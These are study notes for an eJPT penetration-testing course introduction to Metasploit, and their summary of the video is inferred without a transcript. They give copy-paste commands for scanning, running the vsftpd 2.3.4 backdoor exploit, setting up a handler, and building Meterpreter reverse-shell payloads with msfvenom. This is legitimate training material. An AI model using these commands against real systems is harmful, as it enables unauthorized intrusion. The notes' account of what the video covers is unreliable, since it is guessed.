# 01 - Introduction to the Metasploit Framework (eJPT) — Study Notes

Note: No transcript was provided. The following is a conservative, best-practice summary inferred from the title and typical eJPT “Metasploit Framework Overview” content.

## What the video covers (Introduction / big picture)
- What Metasploit is and where it fits in the eJPT workflow (recon → exploitation → post-exploitation → reporting).
- Metasploit components: msfconsole, modules (exploit, auxiliary, post), payloads (e.g., Meterpreter), encoders, evasion, and the PostgreSQL-backed database.
- Basic navigation: searching modules, understanding module info/rank, setting options, running modules, and handling sessions.
- Integrating scans/results (Nmap → Metasploit database) to speed up targeting.
- Safe usage: using check where available, isolating work in workspaces, and logging.

## Flow (ordered)
1. Ensure Metasploit and database are ready (PostgreSQL running; msfconsole starts cleanly).
2. Create/select a workspace to isolate a target environment.
3. Ingest recon data: run Nmap externally or via Metasploit and import results.
4. Enumerate hosts/services in the Metasploit DB and set RHOSTS efficiently.
5. Search and select appropriate modules; review module info, targets, payloads, and options.
6. Configure module options (RHOSTS/RPORT, payload, LHOST/LPORT, threads, etc.).
7. Validate with check (if supported) before exploit; run module.
8. Manage sessions (background/foreground, interact, pivot later if needed).
9. Gather evidence: loot, creds, notes; log console output if required.
10. Clean up jobs/sessions and save state.

## Tools highlighted
- Metasploit Framework (msfconsole)
- Metasploit modules: exploit, auxiliary (scanners/enumeration), post
- Payloads (e.g., Meterpreter), multi/handler
- Metasploit database (PostgreSQL), workspaces, hosts/services/creds/loot
- Nmap integration (db_nmap) and db_import of XML
- msfvenom for payload generation

## Typical command walkthrough (detailed, copy-paste friendly)

Legal/ethical reminder: Use these only in authorized lab environments or with explicit permission.

Shell (system) prep:
```
# Ensure PostgreSQL is running (Kali/Debian-based)
sudo systemctl enable --now postgresql

# Launch Metasploit
msfconsole
```

Inside msfconsole: verify DB and set up a workspace
```
db_status
workspace -a lab01
workspace lab01
```

Option A — Run Nmap externally and import:
```
# In another terminal (shell)
nmap -sV -sC -O -p- -oX scan.xml <TARGET_IP_OR_CIDR>

# Back in msfconsole
db_import scan.xml
hosts
services
```

Option B — Use Metasploit’s Nmap wrapper (if available):
```
db_nmap -sV -sC -O -p- <TARGET_IP_OR_CIDR>
hosts
services
```

Quick navigation and search:
```
help
search type:auxiliary portscan
search cve:2017 type:exploit
search name:vsftpd
```

Module selection and reconnaissance scans:
```
use auxiliary/scanner/portscan/tcp
show options
set RHOSTS <TARGET_IP_OR_CIDR>
set THREADS 50
run
```

Set RHOSTS from DB results (handy filters):
```
hosts -R                      # Set RHOSTS to all hosts in workspace
services -p 80 -R             # Set RHOSTS to hosts with port 80 open
```

Review module details:
```
info
show options
show advanced
show payloads
show targets
```

Exploit example flow (generic; adjust to your target):
```
search vsftpd 2.3.4
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOSTS <TARGET_IP>
check
run
sessions
sessions -i 1
background
```

Payload handler for a reverse shell (pair with msfvenom payload you deliver via another vector):
```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
set LPORT 4444
set ExitOnSession false
run -j
```

Generate a payload (shell):
```
# Windows x64 Meterpreter reverse TCP (EXE)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f exe -o shell.exe

# Linux x64 Meterpreter reverse TCP (ELF)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f elf -o shell.elf
```

Session management and pivot prep (basics):
```
sessions
sessions -i 1
background
jobs
jobs -K
```

DB artifacts, notes, and loot:
```
creds
loot
notes add -t host -h <TARGET_IP> -n "manual-note" -d "Found potential vuln XYZ"
notes
```

Global defaults and persistence:
```
setg LHOST <YOUR_IP>
setg VERBOSE true
save                 # Persist current datastore to config
spool /tmp/msf.log   # Start logging console output
spool off
```

Cleanup:
```
sessions -K
jobs -K
exit
```

If db_status shows “not connected” (in msfconsole):
- Exit msfconsole, ensure PostgreSQL is running (sudo systemctl enable --now postgresql), then relaunch msfconsole.

## Practical tips
- Use workspaces per target or engagement to keep data clean and report-ready.
- Prefer modules with higher ranks (excellent/great) and use check when available to reduce noise.
- Use services -p <port> -R or hosts -R to populate RHOSTS from DB results quickly.
- Set global LHOST once (setg LHOST <YOUR_IP>) to avoid repeating it per-module.
- Run exploitation as a background job (run -j) and manage sessions separately.
- If a module says “No payload configured,” run show payloads and pick a compatible one; also check show targets.
- For long scans, enable spool to log console output for later review.
- Keep THREADS reasonable to avoid DoS-like behavior on fragile hosts.
- When in doubt, import Nmap XML (db_import) rather than relying solely on db_nmap availability.
- Always operate ethically and legally; keep a habit of notes and loot collection for reporting.

## Minimal cheat sheet (one-screen flow)
```
sudo systemctl enable --now postgresql
msfconsole
db_status
workspace -a lab && workspace lab

# Recon (external Nmap → import)
nmap -sV -sC -O -p- -oX scan.xml <TARGET>
# Back in msfconsole
db_import scan.xml
hosts
services

# Quick target set
services -p 80 -R

# Find & run a module
search <keyword>
use <module/path>
show options
set RHOSTS <TARGETS>
set RPORT <PORT>
setg LHOST <YOUR_IP>
check
run -j

# Sessions / evidence
sessions
creds
loot
notes
save
exit
```

## Summary
- Metasploit is a modular framework central to the eJPT workflow for efficient recon, exploitation, and post-exploitation.
- Use the database-backed workflow: workspace → scan/import → hosts/services → targeted modules.
- Learn core console commands: search/use/info/show/set/check/run/sessions.
- Use payload handlers and msfvenom when delivering custom payloads.
- Maintain legality, minimize impact (check, ranks, threads), and preserve findings (loot, notes, spool).